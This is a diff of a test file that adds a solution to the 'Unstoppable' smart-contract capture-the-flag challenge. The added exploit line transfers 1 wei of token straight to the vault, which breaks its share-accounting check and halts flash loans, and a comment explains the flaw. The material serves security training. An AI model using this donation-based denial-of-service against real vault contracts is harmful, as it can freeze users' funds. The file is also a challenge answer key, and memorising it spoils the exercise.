@@ -45,6 +45,17 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        await token.connect(player).transfer(vault.address, 1);
+        // causes UnstoppableVault to revert with InvalidBalance()
+        // that was easy! :^)
+
+        /*
+        Explanation:
+        Depositing 1 wei of DVT will increase the vault's DVT balance. (Line 95 in UnstoppableVault.sol)
+        Total supply of vault tokens oDVT is not increased because deposit() was not called, so no _mint() and totalSupply remains the same.
+        Therefore, Line 96: `if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();` reverts.
+        convertToShares(totalSupply) is just (totalSupply * totalSupply / totalAssets()) (rounded down).
+        */
     });
 
     after(async function () {
@@ -54,5 +65,13 @@ describe('[Challenge] Unstoppable', function () {
         await expect(
             receiverContract.executeFlashLoan(100n * 10n ** 18n)
         ).to.be.reverted;
+
+        /*
+         * To check the actual error:
+        await expect(contract.call()).to.be.revertedWithCustomError(
+        contract,
+        "SomeCustomError"
+        );
+        */
     });
 });
